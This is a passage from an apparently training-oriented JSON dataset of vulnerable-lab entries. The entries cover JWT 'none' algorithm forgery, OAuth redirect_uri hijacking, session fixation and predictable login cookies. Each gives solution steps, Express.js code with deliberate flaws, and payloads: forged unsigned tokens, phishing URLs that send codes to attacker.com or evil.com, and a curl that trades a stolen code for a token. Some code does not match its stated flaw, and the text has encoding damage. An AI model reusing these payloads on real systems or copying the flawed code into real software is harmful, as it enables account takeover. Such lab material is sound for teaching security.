    "Lab Description": "The application accepts JWT tokens for authentication and does not properly enforce algorithm constraints. It accepts unsigned tokens by trusting the 'none' algorithm. To solve: Modify your token to impersonate Carlos and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to log in and capture the issued JWT from the Authorization header.",
      "2. Decode the token on jwt.io and modify the payload to { \"username\": \"carlos\" }.",
      "3. Set the header to { \"alg\": \"none\" } and remove the signature section completely.",
      "4. Send a new request to /my-account using the manipulated token in the Authorization header.",
      "5. Verify access to Carlos's account without needing a valid signature."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'jwt-secret'); res.json({ token }); } else res.status(401).json({ error: 'Invalid credentials' }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT Tampering Lab running on port 4000'));",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "JWT: base64(header).base64(payload).",
      "Authorization: Bearer <tampered-token>"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect vulnerability in redirect_uri parameter",
    "Lab Description": "The application improperly validates redirect URIs during OAuth flows, allowing an attacker to redirect tokens to arbitrary domains. The `redirect_uri` parameter is partially whitelisted, but allows open redirects via parameter manipulation. To solve: Steal Carlos\u00e2\u20ac\u2122s OAuth token and access his protected resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept an OAuth login flow request. Identify the `redirect_uri` parameter.",
      "2. Modify the `redirect_uri` to include a trusted prefix plus `@attacker.com` to bypass validation (e.g., `https://trusted.com@evil.com/oauth`)",
      "3. Host a page on attacker.com to log query strings or fragments (e.g., with `?code=xyz`).",
      "4. Send Carlos a phishing link containing the modified redirect URI.",
      "5. When Carlos logs in, his token is sent to your malicious endpoint. Use this code to retrieve a full access token via Postman.",
      "6. Use the stolen token to call `/my-account` as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/oauth', (req, res) => { const { redirect_uri } = req.query; if (!redirect_uri.startsWith('https://trusted.com')) return res.status(400).send('Invalid redirect'); const token = 'access-token-for-carlos'; res.redirect(`${redirect_uri}?code=${token}`); }); app.get('/my-account', (req, res) => { const { token } = req.query; if (token === 'access-token-for-carlos') res.send('Welcome Carlos'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on port 4000'));",
    "payloads": [
      "redirect_uri=https://trusted.com@evil.com/capture",
      "Phishing link: https://example.com/oauth?redirect_uri=https://trusted.com@evil.com/capture",
      "Captured Code: code=access-token-for-carlos",
      "Token reuse: /my-account?token=access-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT tampering using 'none' algorithm in login token verification",
    "Lab Description": "This lab's login system is vulnerable due to insecure JWT handling. The application accepts the 'alg' value from the header without verification. An attacker can tamper with the token's payload and set the 'alg' to 'none' to forge authentication. To solve: forge a valid JWT for user 'carlos' and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a login request and capture the JWT token from the Set-Cookie response header.",
      "2. Decode the JWT using jwt.io or Postman. Note the structure and content of the payload and header.",
      "3. Modify the payload to {\"username\":\"carlos\"} and change the header to {\"alg\":\"none\"}. Remove the signature part.",
      "4. Reconstruct the JWT with base64-encoded header and payload separated by a dot ('.') and omit the signature.",
      "5. Use Burp or Postman to replace your JWT cookie with the forged one. Refresh the browser or resend a request to /my-account to verify success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const secret = 'supersecretkey'; app.get('/my-account', (req, res) => { const token = req.cookies.token; const user = jwt.verify(token, secret); if (user && user.username === 'carlos') { res.send('Access granted to Carlos account'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Algorithm Lab running on http://localhost:' + PORT));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }."
    ]
  },
  {
    "Lab scenario": "Session fixation in session ID issued on login via Set-Cookie header",
    "Lab Description": "This application allows session fixation through predictable session tokens. The server issues session IDs in a predictable manner and does not regenerate them after successful login. To solve: fix a session ID for 'carlos' before he logs in, and then reuse it to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to register a new account and observe the session cookie named 'sid' in the Set-Cookie response header.",
      "2. Note that session IDs are sequential or time-based (e.g., sid=USER12345). Guess a session ID one step ahead.",
      "3. Send a crafted phishing request to Carlos with the session ID you fixed (e.g., sid=USER12346).",
      "4. Once Carlos logs in, that session ID will be authenticated to his account.",
      "5. Reuse the fixed session cookie (sid=USER12346) in your browser and navigate to /my-account to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'adminpass' }]; const sessions = {}; let counter = 1000; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = 'USER' + counter++; sessions[sid] = username; res.setHeader('Set-Cookie', `sid=${sid}`); res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] === 'carlos') { res.send('Welcome to Carlos account'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "sid=USER12346",
      "sid=USER1002",
      "sid=USER1001"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri parameter",
    "Lab Description": "This lab demonstrates an OAuth 2.0 misconfiguration where the `redirect_uri` parameter is insufficiently validated, allowing attackers to steal authorization codes. To solve: capture a valid OAuth code for 'carlos' using a malicious redirect URI and exchange it for a token to access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify the authorization request URL using Burp (e.g., /auth?client_id=xyz&redirect_uri=https://site.com/callback).",
      "2. Modify the redirect_uri to point to your own domain (https://evil.com/code-stealer) while preserving the hostname prefix.",
      "3. Host a listener on https://evil.com/code-stealer to capture the authorization code via query parameter.",
      "4. Phish the victim into clicking the crafted OAuth URL. After login, the code is sent to your redirect URI.",
      "5. Use Postman to POST the captured code to /oauth/token endpoint with the client credentials to obtain an access token.",
      "6. Add the token to the Authorization header and send a GET request to /my-account to access Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; if (!redirect_uri) return res.status(400).send('Missing redirect'); const authCode = 'oauth-carlos-code'; res.redirect(`${redirect_uri}?code=${authCode}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'oauth-carlos-code') { res.json({ access_token: 'token-carlos-123' }); } else { res.status(403).json({ error: 'Invalid code' }); } }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token-carlos-123') { res.send('Carlos account data'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Redirect Lab running on http://localhost:' + PORT));",
    "payloads": [
      "https://attacker.com/code-stealer?code=oauth-carlos-code",
      "https://evil.com/callback?code=oauth-carlos-code",
      "Authorization: Bearer token-carlos-123"
    ]
  },
  {
    "Lab scenario": "Session Fixation in login flow",
    "Lab Description": "The application improperly handles session tokens during login. Instead of rotating the session ID after authentication, it preserves the existing token. The application allows an attacker to fix a session ID before the victim logs in. To solve: hijack Carlos's session using a fixed session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to capture a valid unauthenticated session cookie from /login",
      "Send a crafted phishing link to Carlos with the fixed session ID in the Cookie header",
      "Wait for Carlos to log in with the fixed session (simulate via Burp's manual login replay)",
      "Use the same session ID in your browser to gain access to Carlos's session",
      "Visit /my-account using the fixed session and confirm access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\" /><input name=\"password\" type=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Welcome, ${req.session.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: connect.sid=sess:12345abcde;",
      "Phishing URL sent with fixed cookie set in request"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm bypass in access tokens",
    "Lab Description": "The application uses JWT tokens for authorization but does not properly verify the signing algorithm. By setting the algorithm to 'none', attackers can forge valid tokens without the secret key. To solve: access Carlos's account page using a tampered JWT.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the Authorization header after logging in",
      "Decode the JWT using jwt.io or Burp Decoder",
      "Craft a new token with {\"alg\": \"none\"} in the header and \"username\": \"carlos\" in the payload",
      "Sign the JWT without a signature section (empty after last dot)",
      "Replace the original token with the forged one and send a request to /my-account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwt123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username: user.username }, 'supersecret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token); res.send(`Welcome, ${payload.username}`); }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer [tampered_token]"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect in callback URL",
    "Lab Description": "The OAuth implementation fails to properly validate redirect URIs. Attackers can inject arbitrary URLs to steal authorization codes or tokens. To solve: hijack Carlos\u00e2\u20ac\u2122s OAuth flow by injecting a malicious redirect URI to capture his access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a GET request to the OAuth login endpoint with a crafted redirect_uri parameter pointing to your malicious domain",
      "Simulate Carlos clicking the malicious login URL (use a temporary redirect server or Burp Collaborator)",
      "Intercept the code/token from the query string after OAuth provider redirects to your malicious domain",
      "Exchange the code/token for user data using the OAuth provider\u00e2\u20ac\u2122s token endpoint",
      "Access the protected /my-account resource using the stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query;  res.redirect(redirect_uri + '?code=' + code); }); app.listen(4000, () => console.log('OAuth Redirect Manipulation Lab running'));",
    "payloads": [
      "https://victim-app.com/auth?redirect_uri=https://evil.com/callback",
      "https://oauth-provider.com/auth?client_id=abc&redirect_uri=https://evil.com/callback&response_type=code"
    ]
  },
  {
    "Lab scenario": "Stay logged in cookie brute-force vulnerability in login mechanism",
    "Lab Description": "The application's 'Stay logged in' feature uses a predictable session cookie format. Upon successful login, the server issues a persistent cookie without strong randomness or HMAC validation. To solve: Brute-force a valid session cookie to impersonate Carlos and access his account page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use Burp Suite to log in with your own account and inspect the 'stay-logged-in' cookie format in the response.",
      "2. Observe that the cookie format is 'username:timestamp' without encryption or HMAC.",
      "3. Generate cookie variations for username 'carlos' with valid timestamps from recent login attempts using a script or Burp Intruder.",
      "4. Replace your cookie with the brute-forced 'carlos' variant in the browser using Burp Proxy or browser DevTools.",
      "5. Navigate to /my-account to confirm successful session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password, stayLoggedIn } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); if (stayLoggedIn) { const cookie = `${username}:${Date.now()}`; res.cookie('stay-logged-in', cookie); } res.send(`Welcome, ${username}`); }); app.get('/my-account', (req, res) => { const cookie = req.cookies['stay-logged-in']; if (cookie && cookie.startsWith('carlos')) { return res.send('Carlos Account Page'); } res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Stay Logged In Cookie Brute-force Lab running on port 4000'));",
    "payloads": [
      "carlos:1714725000000",
      "carlos:1714725050000",
      "carlos:1714725100000"
    ]
  },
  {
    "Lab scenario": "JWT signature validation bypass via 'none' algorithm in authentication token",
    "Lab Description": "The application uses JWT for session management but fails to properly validate the token signature when the 'alg' field is set to 'none'. To solve: Forge a valid-looking token granting admin access and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman or Burp Suite to log in and capture the JWT token issued in the Authorization header.",
      "2. Decode the token using jwt.io and inspect the 'alg' and 'sub' claims.",
      "3. Modify the 'alg' header to 'none' and change the 'sub' claim to 'admin'.",
      "4. Reconstruct the token without a signature using jwt.io or a script.",
      "5. Use the forged token in the Authorization header and access /admin to confirm privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.sub === 'admin') { return res.send('Admin Dashboard'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "{\"alg\":\"none\"}.{\"sub\":\"admin\"}.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth authorization code interception in redirect_uri misconfiguration",
    "Lab Description": "The application uses OAuth for login, but the redirect_uri parameter is not properly validated, allowing attackers to intercept authorization codes. To solve: Intercept an authorization code for Carlos by injecting your own redirect URI and gain access to their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the initial OAuth flow and observe the authorization URL with client_id and redirect_uri parameters.",
      "2. Modify the redirect_uri to point to your server (e.g. https://attacker.com/callback) and capture the intercepted code.",
      "3. On your server, listen for the callback and extract the authorization code from the query string.",
      "4. Use Postman to send a POST request to the token endpoint with the stolen code, client_id, and malicious redirect_uri.",
      "5. Use the obtained access_token to retrieve Carlos's profile data via the /me endpoint and confirm lab success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const oauth = require('simple-oauth2'); const oauthConfig = { client: { id: 'app-client-id', secret: 'secret' }, auth: { tokenHost: 'https://auth-server.com', authorizePath: '/authorize', tokenPath: '/token' } }; app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://auth-server.com/authorize?response_type=code&client_id=app-client-id&redirect_uri=${redirectUri}`; res.redirect(url); }); app.listen(4000, () => console.log('OAuth Redirect URI Injection Lab running on port 4000'));",
    "payloads": [
      "https://attacker.com/callback",
      "https://evil.com/redirect",
      "curl -X POST https://auth-server.com/token -d 'grant_type=authorization_code&code=XYZ123&redirect_uri=https://evil.com/redirect&client_id=app-client-id'"
    ]
  },
  {
    "Lab scenario": "Session Fixation vulnerability in login process",
    "Lab Description": "The session management mechanism allows the session identifier to be set via a query parameter before login. The application fails to regenerate a new session ID after successful authentication, allowing attackers to fixate a session ID and impersonate a user after they log in. To solve: hijack Carlos's session after forcing him to log in via a session you control.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Using Burp Suite, intercept a GET /login request and observe that the application accepts a sessionId as a query parameter.",
      "2.Generate a session fixation link: /login?sessionId=attackerSession123 and send it to the victim via email or open redirect.",
      "3.On the server, monitor incoming requests and wait for the victim to log in using the fixed session ID.",
      "4.After login, reuse the same sessionId=attackerSession123 cookie to access Carlos's account.",
      "5.Visit /my-account while authenticated with the fixed session ID to verify takeover and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { const sid = req.query.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Account page of ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "/login?sessionId=attackerSession123",
      "Cookie: sessionId=attackerSession123"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in Authorization Header",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management but fails to properly validate the signature algorithm. The backend accepts tokens using the 'none' algorithm, allowing an attacker to forge arbitrary tokens without a signature. To solve: tamper with the JWT to impersonate Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Burp Suite to capture the Authorization header after logging in as a regular user.",
      "2.Decode the JWT using jwt.io or jwt-tool and examine its header and payload structure.",
      "3.Change the 'alg' field in the header from 'HS256' to 'none', and set the payload to {\"username\":\"carlos\"}.",
      "4.Base64-encode the modified header and payload, omitting the signature part completely.",
      "5.Replay the request with the tampered JWT in the Authorization header to access Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use(require('body-parser').json()); app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (token) { try { req.user = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); } catch (err) { return res.status(403).send('Invalid token'); } } next(); }); app.get('/my-account', (req, res) => { if (req.user?.username) res.send(`Welcome ${req.user.username}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer [token_above]"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in login flow",
    "Lab Description": "The application implements OAuth for third-party authentication but fails to validate the redirect_uri parameter against a whitelist. This allows an attacker to abuse the login process and capture authorization codes or tokens. To solve: redirect the victim to a malicious callback, extract the token, and impersonate them.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use OWASP ZAP or Burp Suite to intercept the OAuth login flow and locate the redirect_uri parameter.",
      "2.Craft a login URL with redirect_uri pointing to your attacker-controlled server (e.g., https://attacker.site/callback).",
      "3.Send the link to the victim and wait for them to authorize the app.",
      "4.Extract the authorization code or token from the redirected request to your server.",
      "5.Use Postman to exchange the code for an access token and call /my-account as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; if (!user) return res.status(400).send('Missing user'); const code = Buffer.from(`${user}-code`).toString('base64'); tokens[code] = user; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/token', (req, res) => { const { code } = req.query; const user = tokens[code]; if (!user) return res.status(403).send('Invalid code'); res.json({ access_token: `${user}-access-token` }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token?.includes('carlos')) res.send('Access granted to carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on port 4000'));",
    "payloads": [
      "https://example.com/auth?redirect_uri=https://attacker.site/callback&user=carlos",
      "Authorization: Bearer carlos-access-token"
    ]
  },
  {
    "Lab scenario": "Session fixation via login flow in session middleware",
    "Lab Description": "The application fails to regenerate the session ID after login, allowing an attacker to fix a session before authentication. The session ID remains unchanged after login, enabling session hijacking. To solve: hijack Carlos\u00e2\u20ac\u2122s session using a fixed session ID to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept your unauthenticated request to /login and note the Set-Cookie header.",
      "2. Send this session cookie to Burp Repeater and test that the session remains valid pre-login.",
      "3. Use curl/Postman to send a login request with valid credentials but reuse the session cookie.",
      "4. Send the fixed session ID to Carlos (via XSS, phishing, or any other out-of-band vector).",
      "5. Once Carlos logs in using the fixed session ID, reuse the same cookie to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'notsosecret', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); req.session.username = username; res.send(`Welcome ${username}`); }); app.get('/my-account', (req, res) => { if (req.session.username) return res.send(`Account of ${req.session.username}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Set-Cookie: connect.sid=attacker-fixed-id",
      "GET /my-account with Cookie: connect.sid=attacker-fixed-id"
    ]
  },
  {
    "Lab scenario": "JWT signature verification bypass using none algorithm in Authorization header",
    "Lab Description": "The app uses JWT for session management but fails to validate the 'alg' claim properly. It accepts unsigned tokens when 'alg' is set to 'none'. To solve: forge a valid token for Carlos without signing it, and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Log in as a regular user and inspect the JWT token from the Authorization header using Burp or Postman.",
      "2. Decode the token and observe the algorithm used. Modify the 'alg' to 'none' and set the payload to {\"username\":\"carlos\"}.",
      "3. Remove the signature and re-encode the token using jwt.io or Python.",
      "4. Send the forged token as Authorization: Bearer <forged_token> using Postman.",
      "5. Access /my-account endpoint and verify that you are logged in as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username }, 'supersecret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (!payload) return res.status(401).send('Unauthorized'); res.send(`Welcome ${payload.payload.username}`); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "JWT: base64url(header).base64url(payload)."
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in OAuth provider callback",
    "Lab Description": "The application integrates OAuth login via a third-party provider but improperly validates redirect URIs. It allows open redirection using the `redirect_uri` parameter. To solve: manipulate the `redirect_uri` to hijack the access token and access Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp to initiate an OAuth login and capture the full authorization request URL.",
      "2. Modify the `redirect_uri` parameter to an attacker-controlled domain (e.g., attacker.com).",
      "3. Deploy a token-capturing script on attacker.com to log incoming tokens.",
      "4. Trick Carlos into clicking the OAuth login link with the modified `redirect_uri`.",
      "5. Capture the token and use it to access /my-account using Postman with Authorization: Bearer <stolen_token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const redirectURIs = ['http://localhost:4000/callback']; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const url = `https://oauth-provider.com/auth?client_id=abc123&redirect_uri=${redirect_uri}`; res.redirect(url); }); app.get('/callback', async (req, res) => { const { code } = req.query; const token = await axios.post('https://oauth-provider.com/token', { code }); res.send('Logged in with token: ' + token.data.access_token); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running'));",
    "payloads": [
      "https://vulnerableapp.com/auth?redirect_uri=https://attacker.com/callback",
      "OAuth URL with modified redirect: attacker.com/capture?token=xyz",
      "Access token used in: Authorization: Bearer <token>"
    ]
  },
  {
    "Lab scenario": "Session Fixation vulnerability in login flow",
    "Lab Description": "The login process does not regenerate session identifiers after authentication. The application issues a session cookie before login, and the same session is reused post-authentication. This allows an attacker to fixate a session ID and trick a user into authenticating with it. To solve: hijack Carlos's session using a fixed session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login request and note the issued session cookie.",
      "2. Send this fixed session ID to Carlos via phishing or CSRF bait.",
      "3. Wait for Carlos to log in using the fixated session (simulate login as Carlos with that session ID).",
      "4. Reuse the same session ID in your own browser and access /my-account.",
      "5. Confirm you're logged in as Carlos to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; return res.redirect('/my-account'); } res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { if (req.session.username) return res.send('Welcome, ' + req.session.username); res.status(401).send('Not logged in'); }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: connect.sid=sessid123456",
      "Phishing URL using fixed session: http://example.com/login?session=sessid123456",
      "Reuse same session cookie after victim logs in"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in authentication header",
    "Lab Description": "The application uses JWTs for authentication, but fails to verify the token signature when the algorithm is set to 'none'. This allows attackers to forge a valid token without needing the secret key. To solve: forge a token with 'none' algorithm to impersonate Carlos and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Log in with any user and intercept the Authorization: Bearer <token> header using Burp Suite.",
      "2. Decode the JWT at jwt.io and inspect its header and payload.",
      "3. Modify the header to { \"alg\": \"none\" } and payload to { \"username\": \"carlos\" }, then base64 encode both without a signature.",
      "4. Replace the original token in Burp with the forged one.",
      "5. Send a GET /my-account request with the modified token and confirm access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token); if (decoded.username) req.user = decoded; next(); }); app.get('/my-account', (req, res) => { if (req.user?.username === 'carlos') return res.send('Welcome Carlos'); res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "JWT header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "JWT payload: {\"username\":\"carlos\"}",
      "Forged token: base64url(header).base64url(payload). (no signature)"
    ]
  },
  {
    "Lab scenario": "Open redirect vulnerability in OAuth callback endpoint",
    "Lab Description": "The OAuth flow accepts arbitrary redirect_uri values without strict validation. This allows attackers to capture tokens or force victim logins on attacker-controlled domains. To solve: craft a redirect_uri that steals Carlos's OAuth token and gain access to his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to initiate an OAuth login request to /auth?client_id=123&redirect_uri=http://attacker.com/callback.",
      "2. Modify redirect_uri to a domain under your control and complete the OAuth flow.",
      "3. Wait for Carlos to click a phishing link or be redirected.",
      "4. Capture the token from your controlled domain\u00e2\u20ac\u2122s server logs.",
      "5. Use the captured token to craft a GET /my-account request with Authorization: Bearer <token>."
    ],
    "Vulnerability name": "Authentication",
